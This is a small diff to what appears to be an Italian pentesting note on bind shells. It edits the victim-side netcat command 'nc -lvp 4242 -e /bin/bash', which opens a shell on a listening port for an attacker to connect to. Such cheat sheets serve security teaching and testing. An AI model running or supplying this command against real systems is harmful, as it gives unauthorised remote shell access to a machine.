@@ -81,7 +81,7 @@ Nella bind shell è la vittima che si mette in listening e l'attaccante si colle
 ### VITTIMA
 
 ```
-nc -lvnp 4242 -e /bin/bash
+nc -lvp 4242 -e /bin/bash
 ```
 
 ### ATTACCANTE
